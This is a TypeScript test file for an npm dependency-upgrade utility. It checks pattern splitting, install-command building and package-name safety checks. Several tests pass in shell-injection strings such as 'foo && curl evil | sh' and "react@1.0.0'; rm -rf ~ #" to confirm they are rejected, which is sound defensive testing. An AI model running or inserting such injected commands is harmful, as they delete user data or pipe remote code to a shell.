import {assert} from '@augment-vir/assert';
import {PackageJsonDependencyKey, type NpmDeps} from '@augment-vir/node';
import {describe, it} from '@augment-vir/test';
import {
    buildUpgradeInstallCommand,
    buildUpgradeMatches,
    isSafePackageName,
    runArgBasedUpgrade,
    splitUpgradePattern,
} from './upgrade-deps.js';

describe(splitUpgradePattern.name, () => {
    it('defaults to latest for a plain name', () => {
        assert.deepEquals(splitUpgradePattern('react'), {
            namePattern: 'react',
            versionSpecifier: 'latest',
        });
    });

    it('keeps a scoped name intact without a version', () => {
        assert.deepEquals(splitUpgradePattern('@augment-vir/*'), {
            namePattern: '@augment-vir/*',
            versionSpecifier: 'latest',
        });
    });

    it('splits an unscoped name and version', () => {
        assert.deepEquals(splitUpgradePattern('react@^2.0.0'), {
            namePattern: 'react',
            versionSpecifier: '^2.0.0',
        });
    });

    it('splits a scoped name and version on the non-leading @', () => {
        assert.deepEquals(splitUpgradePattern('@scope/pkg@1.2.3'), {
            namePattern: '@scope/pkg',
            versionSpecifier: '1.2.3',
        });
    });
});

describe(isSafePackageName.name, () => {
    it('accepts real npm names and rejects shell-dangerous ones', () => {
        assert.isTrue(isSafePackageName('date-vir'));
        assert.isTrue(isSafePackageName('@scope/foo.bar'));
        assert.isTrue(isSafePackageName('lodash.merge'));
        assert.isFalse(isSafePackageName('foo;rm -rf ~'));
        assert.isFalse(isSafePackageName('foo$(touch x)'));
        assert.isFalse(isSafePackageName("foo'bar"));
        assert.isFalse(isSafePackageName('foo && curl evil | sh'));
    });
});

describe(buildUpgradeMatches.name, () => {
    const allDirectDeps: NpmDeps = {
        'htmlhint-a': [
            {
                requiredBy: '/repo/package.json',
                dependencyKey: PackageJsonDependencyKey.Dependencies,
                versionValue: '^1.0.0',
                isWorkspace: false,
            },
            {
                requiredBy: '/repo/packages/a/package.json',
                dependencyKey: PackageJsonDependencyKey.DevDependencies,
                versionValue: '^1.0.0',
                isWorkspace: false,
            },
        ],
        'htmlhint-workspace': [
            {
                requiredBy: '/repo/package.json',
                dependencyKey: PackageJsonDependencyKey.Dependencies,
                versionValue: '*',
                isWorkspace: true,
            },
        ],
        'htmlhint-override': [
            {
                requiredBy: '/repo/package.json',
                dependencyKey: PackageJsonDependencyKey.Overrides,
                versionValue: '^1.0.0',
                isWorkspace: false,
            },
        ],
        react: [
            {
                requiredBy: '/repo/package.json',
                dependencyKey: PackageJsonDependencyKey.Dependencies,
                versionValue: '^1.0.0',
                isWorkspace: false,
            },
        ],
    };

    it('groups matched, installable deps by package dir and dep section', () => {
        assert.deepEquals(
            buildUpgradeMatches({
                allDirectDeps,
                namePattern: 'htmlhint-*',
            }),
            {
                '/repo': {
                    [PackageJsonDependencyKey.Dependencies]: [
                        'htmlhint-a',
                    ],
                },
                '/repo/packages/a': {
                    [PackageJsonDependencyKey.DevDependencies]: [
                        'htmlhint-a',
                    ],
                },
            },
        );
    });

    it('matches a single exact name', () => {
        assert.deepEquals(
            buildUpgradeMatches({
                allDirectDeps,
                namePattern: 'react',
            }),
            {
                '/repo': {
                    [PackageJsonDependencyKey.Dependencies]: [
                        'react',
                    ],
                },
            },
        );
    });

    it('returns nothing when no name matches', () => {
        assert.deepEquals(
            buildUpgradeMatches({
                allDirectDeps,
                namePattern: '@no-such-scope/*',
            }),
            {},
        );
    });

    it('drops shell-dangerous package names even when they match', () => {
        assert.deepEquals(
            buildUpgradeMatches({
                allDirectDeps: {
                    'evil && curl x | sh': [
                        {
                            requiredBy: '/repo/package.json',
                            dependencyKey: PackageJsonDependencyKey.Dependencies,
                            versionValue: '^1.0.0',
                            isWorkspace: false,
                        },
                    ],
                },
                namePattern: '*',
            }),
            {},
        );
    });
});

describe(buildUpgradeInstallCommand.name, () => {
    it('builds a dev-dep install at a specific version', () => {
        assert.strictEquals(
            buildUpgradeInstallCommand({
                flag: '-D',
                passthroughArgs: [
                    '--loglevel',
                    'silent',
                ],
                depNames: [
                    'a',
                    'b',
                ],
                versionSpecifier: '1.2.3',
            }),
            "npm i -D --loglevel silent 'a@1.2.3' 'b@1.2.3'",
        );
    });

    it('drops the empty flag for plain dependencies', () => {
        assert.strictEquals(
            buildUpgradeInstallCommand({
                flag: '',
                passthroughArgs: [],
                depNames: [
                    'a',
                ],
                versionSpecifier: 'latest',
            }),
            "npm i 'a@latest'",
        );
    });
});

describe(runArgBasedUpgrade.name, () => {
    it('installs each matched group in its own package dir', async () => {
        const commands: {command: string; cwd: string}[] = [];

        await runArgBasedUpgrade({
            depPattern: 'htmlhint-*@1.0.1',
            filteredArgs: [
                'htmlhint-*@1.0.1',
                '--loglevel',
                'silent',
            ],
            monoRepoRootPath: '/repo',
            runShellCommand(command, options) {
                commands.push({
                    command,
                    cwd: options.cwd,
                });
                return Promise.resolve();
            },
            listDirectDeps() {
                return Promise.resolve({
                    'htmlhint-a': [
                        {
                            requiredBy: '/repo/package.json',
                            dependencyKey: PackageJsonDependencyKey.Dependencies,
                            versionValue: '^1.0.0',
                            isWorkspace: false,
                        },
                    ],
                    'htmlhint-b': [
                        {
                            requiredBy: '/repo/packages/a/package.json',
                            dependencyKey: PackageJsonDependencyKey.DevDependencies,
                            versionValue: '^1.0.0',
                            isWorkspace: false,
                        },
                    ],
                });
            },
        });

        assert.deepEquals(commands, [
            {
                command: "npm i --loglevel silent 'htmlhint-a@1.0.1'",
                cwd: '/repo',
            },
            {
                command: "npm i -D --loglevel silent 'htmlhint-b@1.0.1'",
                cwd: '/repo/packages/a',
            },
        ]);
    });

    it('defaults to the latest version when no version is given', async () => {
        const commands: string[] = [];

        await runArgBasedUpgrade({
            depPattern: 'react',
            filteredArgs: [
                'react',
            ],
            monoRepoRootPath: '/repo',
            runShellCommand(command) {
                commands.push(command);
                return Promise.resolve();
            },
            listDirectDeps() {
                return Promise.resolve({
                    react: [
                        {
                            requiredBy: '/repo/package.json',
                            dependencyKey: PackageJsonDependencyKey.Dependencies,
                            versionValue: '^1.0.0',
                            isWorkspace: false,
                        },
                    ],
                });
            },
        });

        assert.deepEquals(commands, [
            "npm i 'react@latest'",
        ]);
    });

    it('rejects a version specifier containing a single quote', async () => {
        await assert.throws(
            () => {
                return runArgBasedUpgrade({
                    depPattern: "react@1.0.0'; rm -rf ~ #",
                    filteredArgs: [
                        "react@1.0.0'; rm -rf ~ #",
                    ],
                    monoRepoRootPath: '/repo',
                    runShellCommand() {
                        return Promise.resolve();
                    },
                    listDirectDeps() {
                        return Promise.resolve({});
                    },
                });
            },
            {
                matchMessage: 'Invalid version specifier',
            },
        );
    });

    it('throws when nothing matches', async () => {
        await assert.throws(
            () => {
                return runArgBasedUpgrade({
                    depPattern: '@no-such-scope/*',
                    filteredArgs: [
                        '@no-such-scope/*',
                    ],
                    monoRepoRootPath: '/repo',
                    runShellCommand() {
                        return Promise.resolve();
                    },
                    listDirectDeps() {
                        return Promise.resolve({});
                    },
                });
            },
            {
                matchMessage: 'No direct dependencies matching',
            },
        );
    });
});
